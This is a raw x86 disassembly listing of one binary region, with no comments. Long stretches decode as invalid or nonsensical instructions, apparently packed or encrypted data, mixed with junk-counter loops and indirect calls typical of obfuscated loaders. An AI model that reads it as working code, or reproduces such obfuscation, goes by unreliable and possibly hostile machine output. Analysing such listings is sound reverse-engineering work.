  407ca2:	mov    ecx,0x356c58c2
  407ca7:	dec    eax
  407ca8:	dec    eax
  407ca9:	ja     0x407d0f
  407cab:	mov    edx,0x249c869b
  407cb0:	sub    al,BYTE PTR [edx-0x50d55d50]
  407cb6:	jmp    0xb3404b96
  407cbb:	jmp    0x407c6c
  407cbd:	adc    bh,BYTE PTR [ebx+0x70]
  407cc0:	retf   0xb7e6
  407cc3:	push   cs
  407cc4:	jl     0x407ced
  407cc6:	out    dx,al
  407cc7:	aaa    
  407cc8:	jnp    0x407cce
  407cca:	ret    
  407ccb:	popa   
  407ccc:	sub    ch,BYTE PTR [ebx]
  407cce:	cmc    
  407ccf:	test   eax,0xa32bbc15
  407cd4:	iret   
  407cd5:	stos   DWORD PTR es:[edi],eax
  407cd6:	mov    DWORD PTR [edi-0x15],eax
  407cd9:	fs cli 
  407cdb:	outs   dx,BYTE PTR ds:[esi]
  407cdc:	rcr    BYTE PTR [edi-0x227ccd71],cl
  407ce2:	pop    ss
  407ce3:	and    dl,BYTE PTR [esi+edi*8+0x513fa03]
  407cea:	xor    eax,0x7348ee14
  407cef:	lea    esp,[esi+0x43bd8db1]
  407cf5:	inc    ebp
  407cf6:	jmp    0x5b71:0x91c3110f
  407cfd:	ss stc 
  407cff:	out    0x64,eax
  407d01:	fisub  WORD PTR [edi-0x303a702d]
  407d07:	in     al,0xb2
  407d09:	in     al,0xa4
  407d0b:	enter  0xfbfb,0x3
  407d0f:	outs   dx,BYTE PTR ds:[esi]
  407d10:	iret   
  407d11:	ins    DWORD PTR es:[edi],dx
  407d12:	sbb    DWORD PTR [ebx*2-0x15f5a15],edx
  407d19:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  407d20:	mov    DWORD PTR ds:0x43428e,0x1a
  407d2a:	cmp    DWORD PTR ds:0x43428e,0x0
  407d31:	je     0x407d7e
  407d37:	cmp    DWORD PTR ds:0x43428e,0x7
  407d3e:	jne    0x407d4c
  407d44:	push   0x9
  407d46:	call   DWORD PTR ds:0x4328ce
  407d4c:	cmp    DWORD PTR ds:0x43428e,0x8
  407d53:	jne    0x407d66
  407d59:	mov    edi,DWORD PTR ds:0x43428e
  407d5f:	dec    edi
  407d60:	mov    DWORD PTR ds:0x43428e,edi
  407d66:	mov    edi,DWORD PTR ds:0x43428e
  407d6c:	dec    edi
  407d6d:	mov    DWORD PTR ds:0x43428e,edi
  407d73:	jmp    0x407d2a
  407d78:	adc    DWORD PTR ds:0x432cce,ecx
  407d7e:	mov    edx,DWORD PTR [ebp+0x8]
  407d81:	xor    edx,eax
  407d83:	sbb    edi,DWORD PTR ds:0x43429a
  407d89:	mov    edi,DWORD PTR [ebp-0x10]
  407d8c:	add    edx,ecx
  407d8e:	cmp    edi,edx
  407d90:	jmp    0x407fa4
  407d95:	mov    BYTE PTR [ebp+0x51b14fb4],ch
  407d9b:	jae    0x407e12
  407d9d:	xchg   esp,eax
  407d9e:	xor    al,0x31
  407da0:	xchg   BYTE PTR [eax-0x33],dh
  407da3:	xchg   ebx,eax
  407da4:	sahf   
  407da5:	dec    ebp
  407da6:	retf   0x7070
  407da9:	imul   edi,DWORD PTR [edi+0x70],0x639c7b70
  407db0:	mov    al,BYTE PTR [ebx]
  407db2:	xchg   esp,eax
  407db3:	es push eax
  407db5:	inc    ecx
  407db6:	pop    ebp
  407db7:	ret    
  407db8:	cmp    al,0xb6
  407dba:	jge    0x407dc3
  407dbc:	push   edx
  407dbd:	sbb    bl,BYTE PTR [edx+ecx*1+0x47]
  407dc1:	int3   
  407dc2:	mov    al,0x94
  407dc4:	inc    ebx
  407dc5:	rcr    DWORD PTR [ebx],0xbb
  407dc8:	cs (bad) 
  407dca:	mov    edi,0xec917d9b
  407dcf:	add    bl,BYTE PTR [ebx-0x26]
  407dd2:	mov    ah,0xa5
  407dd4:	stos   BYTE PTR es:[edi],al
  407dd5:	pop    esp
  407dd6:	mov    ds:0xfca4f611,eax
  407ddb:	les    ebx,FWORD PTR [eax]
  407ddd:	sbb    al,0xb4
  407ddf:	aad    0x3c
  407de1:	lods   eax,DWORD PTR ds:[esi]
  407de2:	mov    eax,0xf1aa2ee5
  407de7:	mov    edx,0xb952def2
  407dec:	xchg   edi,eax
  407ded:	test   DWORD PTR [eax-0x124ca2df],esp
  407df3:	cld    
  407df4:	push   edi
  407df5:	adc    eax,0x3e0d94bb
  407dfa:	add    BYTE PTR gs:[ecx],cl
  407dfd:	mov    ebp,DWORD PTR [eax+0x64]
  407e00:	mov    eax,ds:0x88d6d8fe
  407e05:	xor    cl,BYTE PTR [edx+0x7]
  407e08:	sub    BYTE PTR [esi-0x26c2e1c6],dh
  407e0e:	fdiv   QWORD PTR [esi-0x6ac7b308]
  407e14:	mov    edi,0x77c13f9f
  407e19:	ja     0x407e72
  407e1b:	jg     0x407e2f
  407e1d:	sbb    BYTE PTR [edx+ebx*2+0x64],al
  407e21:	jnp    0x407da8
  407e23:	mov    edx,0xd1ab7750
  407e28:	iret   
  407e29:	ret    
  407e2a:	xchg   ecx,eax
  407e2b:	fidiv  WORD PTR [edx-0x5033895b]
  407e31:	outs   dx,DWORD PTR ds:[esi]
  407e32:	ins    DWORD PTR es:[edi],dx
  407e33:	in     eax,dx
  407e34:	(bad)  
  407e35:	jecxz  0x407e07
  407e37:	fs dec ebp
  407e39:	(bad)
  407e3e:	pop    esp
  407e3f:	in     eax,0xb
  407e41:	popf   
  407e42:	xchg   ebp,eax
  407e43:	test   al,0x57
  407e45:	or     dl,BYTE PTR [edi-0x48014b2e]
  407e4b:	cmp    al,0xfa
  407e4d:	fadd   QWORD PTR [eax]
  407e4f:	in     eax,dx
  407e50:	or     bh,BYTE PTR [esp+ebx*1+0x510ed5f9]
  407e57:	inc    ecx
  407e58:	mov    al,ds:0x7191a19f
  407e5d:	mov    eax,DWORD PTR [eax-0x38]
  407e60:	sbb    BYTE PTR [edi],bl
  407e62:	xchg   ecx,eax
  407e63:	int3   
  407e64:	dec    ecx
  407e65:	pusha  
  407e66:	xor    ah,ah
  407e68:	push   cs
  407e69:	leave  
  407e6a:	inc    DWORD PTR [ecx]
  407e6c:	test   al,0xb1
  407e6e:	mov    ecx,0x29373255
  407e73:	lods   eax,DWORD PTR ds:[esi]
  407e74:	mov    dh,0x2c
  407e76:	add    ebx,esi
  407e78:	daa    
  407e79:	(bad)  
  407e7a:	fimul  DWORD PTR [edi+0x27]
  407e7d:	inc    esi
  407e7e:	push   esi
  407e7f:	cdq    
  407e80:	outs   dx,DWORD PTR ds:[esi]
  407e81:	add    eax,0xaed9f22a
  407e86:	and    BYTE PTR [esi-0x64],ah
  407e89:	outs   dx,BYTE PTR ds:[esi]
  407e8a:	mov    al,ds:0x61f791e2
  407e8f:	adc    eax,0x9ef80caf
  407e94:	(bad)  
  407e95:	pop    esp
  407e96:	jb     0x407e9c
  407e98:	sbb    BYTE PTR [edx],bl
  407e9a:	or     BYTE PTR [esi+0x3],cl
  407e9d:	dec    edx
  407e9e:	jns    0x407e38
  407ea0:	out    dx,al
  407ea1:	pop    es
  407ea2:	jns    0x407f20
  407ea4:	mov    eax,ds:0x46f50287
  407ea9:	pop    ecx
  407eaa:	das    
  407eab:	imul   esp,DWORD PTR ds:0x8168b7b2,0xf49cc91b
  407eb5:	lods   al,BYTE PTR ds:[esi]
  407eb6:	pop    edx
  407eb7:	sub    BYTE PTR [ebp+0x7f],dl
  407eba:	sbb    al,0x6c
  407ebc:	sbb    BYTE PTR [edi+ebp*4-0x1975b0e6],al
  407ec3:	mov    ebp,0xda5e0a5b
  407ec8:	sar    edi,cl
  407eca:	shl    DWORD PTR [esi-0xd261207],cl
  407ed0:	(bad)  
  407ed2:	jb     0x407ea2
  407ed4:	mov    bh,BYTE PTR [esi-0x20]
  407ed7:	cmp    ebx,DWORD PTR [esi+edx*1-0x49]
  407edb:	mov    eax,0xb2f80984
  407ee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ee1:	and    al,0xf3
  407ee3:	push   eax
  407ee4:	inc    ecx
  407ee5:	jns    0x407f4f
  407ee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ee8:	jno    0x407efe
  407eea:	and    DWORD PTR ds:0xc6270951,ebx
  407ef0:	inc    ebx
  407ef1:	loop   0x407e8d
  407ef3:	loop   0x407f5e
  407ef5:	sti    
  407ef6:	mov    dl,0x7c
  407ef8:	fs pushf 
  407efa:	ficom  WORD PTR [esi-0x67e74dab]
  407f00:	mov    dh,0xcf
  407f02:	stos   BYTE PTR es:[edi],al
  407f03:	not    BYTE PTR [ecx-0x6d04ca2c]
  407f09:	push   es
  407f0a:	mov    edi,0x1be26b9c
  407f0f:	xchg   edi,eax
  407f10:	in     al,0x4a
  407f12:	retf   0xe1fb
  407f15:	add    dh,bh
  407f17:	cld    
  407f18:	jg     0x407ebb
  407f1a:	inc    eax
  407f1b:	ret    0xd623
  407f1e:	shl    ecx,1
  407f20:	repnz fcmovbe st,st(2)
  407f23:	into   
  407f24:	ins    DWORD PTR es:[edi],dx
  407f25:	or     ecx,DWORD PTR [eax+edx*4-0x5a]
  407f29:	ins    BYTE PTR es:[edi],dx
  407f2a:	and    eax,0x6f5c003a
  407f2f:	xor    al,0x75
  407f31:	(bad)  
  407f33:	jne    0x407f1a
  407f35:	add    ecx,DWORD PTR [esi+0x47]
  407f38:	sbb    esi,DWORD PTR [ebx+0x62a36bca]
  407f3e:	dec    ebx
  407f3f:	jne    0x407f00
  407f41:	pop    ebx
  407f42:	or     eax,0xfc7d6dea
  407f47:	sub    edi,DWORD PTR [eax+0x1618c4ff]
  407f4d:	jg     0x407f25
  407f4f:	loopne 0x407f73
  407f51:	push   cs
  407f52:	inc    ebp
  407f53:	ins    BYTE PTR es:[edi],dx
  407f54:	addr16 pusha 
  407f56:	mov    cl,0x3f
  407f58:	xchg   ebp,eax
  407f59:	repnz cld 
  407f5b:	sbb    DWORD PTR [ebx-0x18],esi
  407f5e:	and    cl,BYTE PTR [ecx+0x41]
  407f61:	ja     0x407efb
  407f63:	pop    eax
  407f64:	sti    
  407f65:	es mov ch,0xdd
  407f68:	in     eax,0x31
  407f6a:	mov    al,ds:0x7d8b510c
  407f6f:	push   es
  407f70:	sub    al,BYTE PTR [ebp+0x2f98dc54]
  407f76:	lock jnp 0x407f73
  407f79:	daa    
  407f7a:	iret   
  407f7b:	add    esi,DWORD PTR [ebp+0x103ec109]
  407f81:	mov    eax,0x50b2792b
  407f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f87:	xchg   DWORD PTR [ecx+0x6254249b],edi
  407f8d:	test   al,0xd4
  407f8f:	cdq    
  407f90:	lock ret 
  407f92:	les    eax,FWORD PTR [edx+0x1a4bb086]
  407f98:	push   es
  407f99:	sar    DWORD PTR [edx-0x1a],cl
  407f9c:	popf   
  407f9d:	or     DWORD PTR [edi],ebx
  407f9f:	fst    QWORD PTR [esi-0x5a]
  407fa2:	inc    edx
  407fa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fa4:	je     0x409cf3
  407faa:	push   ebx
  407fab:	mov    DWORD PTR ds:0x43427a,0x643a
  407fb5:	jmp    0x409aba
  407fba:	mov    DWORD PTR ds:0x432608,0x445
  407fc4:	mov    edx,DWORD PTR [ebp-0x8]
  407fc7:	and    DWORD PTR ds:0x43428a,0x0
  407fd1:	jmp    0x407fe5
  407fd6:	xor    edi,edi
  407fd8:	or     edi,DWORD PTR ds:0x43428a
  407fde:	inc    edi
  407fdf:	mov    DWORD PTR ds:0x43428a,edi
  407fe5:	cmp    DWORD PTR ds:0x43428a,0x18
  407fec:	jae    0x40802f
  407ff2:	cmp    DWORD PTR ds:0x43428a,0xc
  407ff9:	jne    0x40800a
  407fff:	push   0x7154
  408004:	call   DWORD PTR ds:0x432b3e
  40800a:	cmp    DWORD PTR ds:0x43428a,0xb
  408011:	jne    0x408024
  408017:	mov    edi,DWORD PTR ds:0x43428a
  40801d:	inc    edi
  40801e:	mov    DWORD PTR ds:0x43428a,edi
  408024:	jmp    0x407fd6
  408029:	xor    DWORD PTR ds:0x43429e,ecx
  40802f:	mov    edi,DWORD PTR [ebp-0x10]
  408032:	jmp    0x408246
  408037:	(bad)  
  408038:	jmp    0x408005
  40803a:	adc    ebp,DWORD PTR [ecx+0x33]
  40803d:	inc    esi
  40803e:	jno    0x40804f
  408040:	pushf  
  408041:	jo     0x407fca
  408043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408044:	dec    edx
  408045:	icebp  
  408046:	mov    esp,0x7070c846
  40804b:	imul   edi,DWORD PTR [edi+0x70],0xc8eb270
  408052:	cmp    BYTE PTR [ebx-0x3a9f476f],cl
  408058:	fwait
  408059:	ret    0x6cc7
  40805c:	mov    eax,ds:0xd6b02c5f
  408061:	mov    esp,0x49faf908
  408066:	push   ebp
  408067:	pop    edx
  408068:	call   0x1769:0xbe307826
  40806f:	add    ebp,DWORD PTR [edx]
  408071:	cmp    al,BYTE PTR [esp+eiz*4+0xc11227c]
  408078:	cdq    
  408079:	mov    esi,0x4e7cbfa6
  40807e:	(bad)  [edx-0x3af2b181]
  408084:	sti    
  408085:	or     ch,BYTE PTR [edi]
  408087:	pop    edi
  408088:	dec    esp
  408089:	lock mov dl,BYTE PTR [edi+0x5c09d81a]
  408090:	sbb    al,0x35
  408092:	fisttp WORD PTR [esp+ebx*2]
  408095:	stos   DWORD PTR es:[edi],eax
  408096:	aad    0x1a
  408098:	mov    ebp,0xa9c44b4
  40809d:	rol    bl,cl
  40809f:	adc    edi,ecx
  4080a1:	retf   0x709
  4080a4:	psubq  mm5,mm4
  4080a7:	pop    eax
  4080a8:	xchg   BYTE PTR [esi],dh
  4080aa:	or     al,0xa0
  4080ac:	or     cl,BYTE PTR [ebp-0x55]
  4080af:	or     ecx,DWORD PTR [esp+esi*4-0xc13f685]
  4080b6:	xlat   BYTE PTR ds:[ebx]
  4080b7:	div    BYTE PTR [esi-0x55375d20]
  4080bd:	fmulp  st(3),st
  4080bf:	or     eax,0xca6fdff4
  4080c4:	add    DWORD PTR [ebx],ebp
  4080c6:	mov    bl,0x52
  4080c8:	out    0x22,eax
  4080ca:	pop    ds
  4080cb:	pop    es
  4080cc:	pop    edi
  4080cd:	sub    eax,0xf46230a7
  4080d2:	xchg   esp,eax
  4080d3:	add    DWORD PTR [edx+0x148fd988],edi
  4080d9:	aaa    
  4080da:	mov    cl,0x73
  4080dc:	mov    ecx,0xf06940e4
  4080e1:	pusha  
  4080e2:	nop
  4080e3:	ja     0x408135
  4080e5:	pop    eax
  4080e6:	push   ss
  4080e7:	dec    esp
  4080e8:	sub    eax,0xf7e58e88
  4080ed:	jns    0x40807c
  4080ef:	dec    esp
  4080f0:	push   ecx
  4080f1:	aaa    
  4080f2:	(bad)  
  4080f3:	adc    WORD PTR [edi-0x1ef42089],dx
  4080fa:	mov    esp,0x6cfd9548
  4080ff:	test   DWORD PTR [eax+0x761dd92f],esi
  408105:	inc    eax
  408106:	ret    0xf192
  408109:	ja     0x4080e1
  40810b:	xor    eax,0xe0e7c572
  408110:	push   ds
  408111:	icebp  
  408112:	cwde   
  408113:	mov    cl,0x7
  408115:	add    al,0xe4
  408117:	lea    eax,[esi+0x5f]
  40811a:	push   es
  40811b:	push   edi
  40811c:	cmp    bh,ch
  40811e:	pop    edx
  40811f:	inc    dh
  408121:	cli    
  408122:	gs cmc 
  408124:	cmc    
  408125:	dec    edx
  408126:	pusha  
  408127:	mov    dh,0x6a
  408129:	inc    edx
  40812a:	je     0x4080f9
  40812c:	mov    dh,0x76
  40812e:	sahf   
  40812f:	clc    
  408130:	push   ebp
  408131:	dec    edi
  408132:	mov    bl,0x89
  408134:	or     ah,BYTE PTR [edi]
  408136:	in     al,0xd7
  408138:	mov    eax,0xfeab186b
  40813d:	aam    0x1b
  40813f:	cmp    edi,eax
  408141:	fcom   DWORD PTR [eax+0x160d0ed7]
  408147:	rcl    DWORD PTR [edx-0x2],cl
  40814a:	pop    esp
  40814b:	imul   esp,esi,0x310ccd9
  408151:	jmp    0x4081b9
  408153:	mov    ds:0x866ebe3d,al
  408158:	and    edx,DWORD PTR [esi+eax*2]
  40815b:	int3   
  40815c:	jg     0x40816f
  40815e:	dec    ecx
  40815f:	jmp    0x3dff44bc
  408164:	(bad)  
  408165:	xor    dl,BYTE PTR [edx-0x53558f27]
  40816b:	mov    bh,BYTE PTR [edx-0x37]
  40816e:	test   eax,0xf1171727
  408173:	ss jp  0x40814e
  408176:	or     cl,BYTE PTR [eax]
  408178:	dec    ebp
  408179:	or     eax,0x87b11af6
  40817e:	stc    
  40817f:	mov    WORD PTR [edx+0x18],ss
  408182:	ins    BYTE PTR es:[edi],dx
  408183:	sbb    esp,DWORD PTR [edi+0x3fb96908]
  408189:	pop    ebx
  40818a:	inc    ecx
  40818b:	leave  
  40818c:	enter  0x275e,0x48
  408190:	out    dx,al
  408191:	mov    al,0x8c
  408193:	lahf   
  408194:	push   esi
  408195:	test   eax,0x823692
  40819a:	mov    ebp,0x3fddac47
  40819f:	inc    edi
  4081a0:	jmp    0x17b:0xb1c7a3f8
  4081a7:	jmp    0xeab8:0x78519776
  4081ae:	enter  0x132f,0x93
  4081b2:	bound  eax,QWORD PTR [esi+0x30]
  4081b5:	or     cl,BYTE PTR [eax-0x13922571]
  4081bb:	mov    dh,BYTE PTR [ebp+0x13]
  4081be:	dec    ebx
  4081bf:	ins    BYTE PTR es:[edi],dx
  4081c0:	out    0x97,al
  4081c2:	xchg   BYTE PTR [edx],bl
  4081c4:	xchg   ebx,eax
  4081c5:	xchg   ebx,eax
  4081c6:	inc    eax
  4081c7:	mov    ebp,0x6fae2310
  4081cc:	lds    ebx,FWORD PTR [edx+0x78]
  4081cf:	sub    esp,DWORD PTR [edx-0x5412c0fa]
  4081d5:	and    ebx,edi
  4081d7:	pop    ebx
  4081d8:	add    ah,0x97
  4081db:	pushf  
  4081dc:	int3   
  4081dd:	adc    al,0x73
  4081df:	je     0x40825f
  4081e1:	mov    edi,0x1ad62ace
  4081e6:	add    eax,0x2c92b8a4
  4081eb:	das    
  4081ec:	cmp    al,0x7
  4081ee:	js     0x40824d
  4081f0:	outs   dx,BYTE PTR ds:[esi]
  4081f1:	mov    bh,0xe9
  4081f3:	hlt    
  4081f4:	xchg   ebx,eax
  4081f5:	mov    edi,0xe6ec3da0
  4081fa:	(bad)  
  4081fb:	pop    eax
  4081fc:	add    eax,0x9ab5f3ff
  408201:	neg    DWORD PTR [esi-0x32767ceb]
  408207:	jnp    0x408231
  408209:	aam    0xf1
  40820b:	add    cl,BYTE PTR [eax]
  40820d:	push   ebp
  40820e:	lds    esi,FWORD PTR [edx+0x2a]
  408211:	ss loop 0x408221
  408214:	mov    ch,0x5a
  408216:	les    edi,FWORD PTR [ebx]
  408218:	push   esi
  408219:	sub    BYTE PTR [ecx+0x1d],0x4
  40821d:	pop    ecx
  40821e:	inc    esi
  40821f:	pop    ss
  408220:	dec    edx
  408221:	cmc    
  408222:	stc    
  408223:	inc    ecx
  408224:	retf   0xbe4b
  408227:	scas   eax,DWORD PTR es:[edi]
  408228:	jno    0x408294
  40822a:	mov    dl,0x47
  40822c:	(bad)  [edi]
  40822e:	xchg   ecx,eax
  40822f:	rcl    DWORD PTR [eax+0x34],0xc1
  408233:	xor    eax,0x438760a0
  408238:	mov    esp,0x8e7d2a34
  40823d:	pop    ds
  40823e:	retf   
  40823f:	fstp   TBYTE PTR [eax-0x53b9eb8a]
  408245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408246:	sub    edi,edx
  408248:	mov    edx,DWORD PTR [ebp-0x4]
  40824b:	xor    edx,eax
  40824d:	sbb    DWORD PTR ds:0x432ce2,0x10fd
  408257:	add    edx,ecx
  408259:	mov    DWORD PTR ds:0x434272,0xe69
  408263:	cmp    edi,edx
  408265:	mov    DWORD PTR ds:0x434286,0xfd5
  40826f:	jmp    0x408483
  408274:	sbb    DWORD PTR [edi+eiz*4],ebp
  408277:	pop    edx
  408278:	mov    ch,0x71
  40827a:	loope  0x4082e7
  40827c:	push   ebx
  40827d:	inc    edx
  40827e:	test   al,0x19
  408280:	rcl    DWORD PTR [ecx-0x294012cc],cl
  408286:	jo     0x4082f8
  408288:	imul   edi,DWORD PTR [edi+0x70],0x1185a570
  40828f:	sub    edx,DWORD PTR [ebx+0x78f5ffaf]
  408295:	pop    edx
  408296:	jo     0x4082ce
  408298:	mov    al,0x9c
  40829a:	pop    es
  40829b:	popf   
  40829c:	imul   ecx,ebp,0x79bb3ece
  4082a2:	or     DWORD PTR [edx],ebx
  4082a4:	or     BYTE PTR [ebx-0x20],0x16
  4082a8:	xchg   esp,eax
  4082a9:	mov    ch,0xc8
  4082ab:	xlat   BYTE PTR ds:[ebx]
  4082ac:	sbb    DWORD PTR [edx+ebx*1+0xa],esi
  4082b0:	jbe    0x4082c7
  4082b2:	jnp    0x408300
  4082b4:	cmp    dh,BYTE PTR [edx]
  4082b6:	hlt    
  4082b7:	test   DWORD PTR [esp+edi*8-0x2c49c5a0],edx
  4082be:	ins    BYTE PTR es:[edi],dx
  4082bf:	test   eax,0x7ec91b6c
  4082c4:	or     BYTE PTR [edi+eiz*2+0x49],0x7d
  4082c9:	ss mov ebx,0xad256e14
  4082cf:	in     eax,0x86
  4082d1:	adc    ch,BYTE PTR [esi+0xe]
  4082d4:	xor    ecx,DWORD PTR [ebp+ecx*1+0x16]
  4082d8:	ja     0x4082fb
  4082da:	xchg   edi,eax
  4082db:	xor    BYTE PTR [edi+0xe],al
  4082de:	fld    st(6)
  4082e0:	push   ebp
  4082e1:	cmp    bh,dl
  4082e3:	pop    eax
  4082e4:	test   DWORD PTR [edx+0x3af6d9c0],0x21a695d5
  4082ee:	pop    DWORD PTR [esi-0x54]
  4082f1:	pop    edx
  4082f2:	cmp    esp,DWORD PTR [edx-0x5d]
  4082f5:	(bad)
  4082f8:	cmp    al,0xe1
  4082fa:	lock cmp edi,DWORD PTR [esi+0x61b9127e]
  408301:	and    BYTE PTR [ebx+0x31bca4c3],cl
  408307:	push   0xa5345092
  40830c:	ror    dl,1
  40830e:	fistp  DWORD PTR [ebx+0x1daa0545]
  408314:	retf   
  408315:	mov    ch,0xa6
  408317:	jo     0x40830c
  408319:	call   0xbe89:0x59ef9b1b
  408320:	je     0x408359
  408322:	mov    bh,0x66
  408324:	or     cl,BYTE PTR [esi+0x12caa7c5]
  40832a:	dec    esp
  40832b:	jo     0x408360
  40832d:	and    eax,0x7d046f01
  408332:	sbb    DWORD PTR [esi+eiz*2],ecx
  408335:	pop    eax
  408336:	scas   eax,DWORD PTR es:[edi]
  408337:	xor    al,0x29
  408339:	xor    ecx,ebp
  40833b:	sub    esp,DWORD PTR [edi+ebx*8-0x14]
  40833f:	retf   0xbfa6
  408342:	ja     0x4083b1
  408344:	mov    ds:0xd8c8f133,al
  408349:	and    BYTE PTR [edx],al
  40834b:	xchg   cl,cl
  40834d:	das    
  40834e:	and    edi,DWORD PTR [ebp+0x1ef49040]
  408354:	inc    ebp
  408355:	out    dx,al
  408356:	xchg   eax,eax
  408358:	scas   eax,DWORD PTR es:[edi]
  408359:	mov    eax,ds:0xa3fef27f
  40835e:	ins    DWORD PTR es:[edi],dx
  40835f:	mov    fs,WORD PTR [edi+0x61]
  408362:	out    dx,al
  408363:	dec    ecx
  408364:	jp     0x4083de
  408366:	push   ss
  408367:	pop    esi
  408368:	jl     0x408373
  40836a:	out    dx,eax
  40836b:	sbb    al,BYTE PTR [esi-0x74]
  40836e:	or     DWORD PTR [edi],0xffffffca
  408371:	fwait
  408372:	call   0x3c5322ed
  408377:	mov    bl,0xd1
  408379:	ss popf 
  40837b:	mov    eax,0xf580ef32
  408380:	sti    
  408381:	jecxz  0x408334
  408383:	loop   0x408403
  408385:	(bad)  [edi]
  408387:	fcomp  QWORD PTR [edx-0x50]
  40838a:	dec    ebp
  40838b:	or     DWORD PTR [edx-0x497aac3],esp
  408391:	mov    ah,0xf7
  408393:	xor    edi,DWORD PTR [ecx+0x75b28728]
  408399:	sbb    eax,DWORD PTR cs:[ecx+0xa]
  40839d:	dec    esi
  40839e:	mov    ch,0x4
  4083a0:	fsub   DWORD PTR [esi-0x6e]
  4083a3:	(bad)  
  4083a5:	xor    esi,esp
  4083a7:	neg    BYTE PTR [ebp-0x23]
  4083aa:	mov    ebp,DWORD PTR [edx]
  4083ac:	or     bl,cl
  4083ae:	mov    ds:0x1d0f5e55,eax
  4083b3:	es push ss
  4083b5:	mov    esp,0x1bff71f3
  4083ba:	shl    BYTE PTR [eax],0xf6
  4083bd:	arpl   bx,ax
  4083bf:	jae    0x40837e
  4083c1:	out    dx,eax
  4083c2:	xchg   esp,eax
  4083c3:	xlat   BYTE PTR ds:[ebx]
  4083c4:	test   al,0x43
  4083c6:	sbb    ebp,DWORD PTR [ecx+eiz*8+0x2f]
  4083ca:	push   es
  4083cb:	cs mov ecx,0x351366f5
  4083d1:	dec    esp
  4083d2:	cli    
  4083d3:	xor    ebx,DWORD PTR [ebx+0x34]
  4083d6:	(bad)  
  4083d7:	jnp    0x4083df
  4083d9:	cmp    dl,BYTE PTR [esi+0x2bbd5d66]
  4083df:	out    dx,al
  4083e0:	jns    0x40843b
  4083e2:	or     eax,0xf8673a8
  4083e7:	jle    0x4083f7
  4083e9:	shr    DWORD PTR [eax+0x2c],cl
  4083ec:	sti    
  4083ed:	stc    
  4083ee:	call   0x59d8cca3
  4083f3:	pop    ss
  4083f4:	xor    DWORD PTR [ecx+0x47],esp
  4083f7:	test   al,0xc5
  4083f9:	dec    ebp
  4083fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083fb:	(bad)  
  4083fc:	adc    al,0x62
  4083fe:	pop    ebx
  4083ff:	icebp  
  408400:	pop    esp
  408401:	daa    
  408402:	mov    ss,WORD PTR [esi+0x24]
  408405:	cdq    
  408406:	lods   eax,DWORD PTR ds:[esi]
  408407:	stos   DWORD PTR es:[edi],eax
  408408:	clc    
  408409:	pop    ecx
  40840a:	test   al,0x23
  40840c:	push   ss
  40840d:	pop    ss
  40840e:	dec    edx
  40840f:	test   BYTE PTR [edi-0x3fc7c3f6],dh
  408415:	jb     0x40843d
  408417:	dec    esp
  408418:	sub    BYTE PTR ds:0xc3eca751,ah
  40841e:	mov    ds:0xe48d8d63,eax
  408423:	mov    bh,0xed
  408425:	bound  esi,QWORD PTR [ebx]
  408427:	cmp    edi,esi
  408429:	or     ebx,ecx
  40842b:	fnstcw WORD PTR [ecx-0x3eb641ad]
  408431:	mov    esi,0xe4bd08d4
  408436:	mov    ebx,edx
  408438:	mov    ecx,0x6e83db61
  40843d:	push   ebp
  40843e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40843f:	dec    ebx
  408440:	cs xchg ebp,ebp
  408443:	push   edi
  408444:	xchg   esp,eax
  408445:	jecxz  0x4084a8
  408447:	xchg   edx,eax
  408448:	sbb    esi,0x52
  40844b:	and    DWORD PTR [esi*4+0x2cfd3720],edx
  408452:	ss cmp edi,ebp
  408455:	sub    al,BYTE PTR [ebx]
  408457:	ficom  WORD PTR [eax+0x5f]
  40845a:	jge    0x4084c2
  40845c:	cmp    DWORD PTR [eax],eax
  40845e:	add    DWORD PTR [edx+0x7ee03223],ebx
  408464:	xchg   edi,ebp
  408466:	lods   eax,DWORD PTR ds:[esi]
  408467:	and    BYTE PTR [eax+0x4f],cl
  40846a:	sbb    DWORD PTR [eax-0x7d90e8f9],edi
  408470:	cs xchg ebx,eax
  408472:	sbb    esi,DWORD PTR [ebp+0x58]
  408475:	lods   eax,DWORD PTR ds:[esi]
  408476:	cmp    DWORD PTR [edx],ecx
  408478:	fnstenv [ebp+0x3d6f1abb]
  40847e:	xor    edx,DWORD PTR [edx]
  408480:	(bad)  
  408481:	jmp    0x4084fa
  408483:	jb     0x409cf2
  408489:	mov    edx,DWORD PTR [ebp-0x28]
  40848c:	sbb    edi,0x56c5
  408492:	mov    edi,DWORD PTR [ebp-0x4]
  408495:	xor    ebx,DWORD PTR ds:0x432cd6
  40849b:	xor    edx,eax
  40849d:	and    DWORD PTR ds:0x434311,0x0
  4084a7:	jmp    0x4084bb
  4084ac:	xor    ebx,ebx
  4084ae:	xor    ebx,DWORD PTR ds:0x434311
  4084b4:	inc    ebx
  4084b5:	mov    DWORD PTR ds:0x434311,ebx
  4084bb:	cmp    DWORD PTR ds:0x434311,0x18
  4084c2:	jae    0x4084e3
  4084c8:	cmp    DWORD PTR ds:0x434311,0x22
  4084cf:	jne    0x4084de
  4084d5:	push   DWORD PTR [ebp-0x1c]
  4084d8:	call   DWORD PTR ds:0x432b42
  4084de:	jmp    0x4084ac
  4084e3:	xor    edi,eax
  4084e5:	add    edi,ecx
  4084e7:	mov    ebx,DWORD PTR ds:0x43431d
  4084ed:	add    DWORD PTR ds:0x432cca,ebx
  4084f3:	add    edx,ecx
  4084f5:	add    DWORD PTR ds:0x434266,ecx
  4084fb:	imul   edx,edi
  4084fe:	mov    edi,DWORD PTR [ebp-0x8]
  408501:	mov    ebx,DWORD PTR ds:0x43432d
  408507:	or     DWORD PTR ds:0x434319,ebx
  40850d:	mov    ebx,DWORD PTR [ebp-0x10]
  408510:	sub    ebx,edi
  408512:	cmp    ebx,edx
  408514:	mov    DWORD PTR ds:0x434325,0x4da5
  40851e:	ja     0x40879c
  408524:	and    DWORD PTR ds:0x4325fc,0x0
  40852e:	jmp    0x408540
  408533:	mov    edx,DWORD PTR ds:0x4325fc
  408539:	inc    edx
  40853a:	mov    DWORD PTR ds:0x4325fc,edx
  408540:	cmp    DWORD PTR ds:0x4325fc,0x1b
  408547:	jae    0x408786
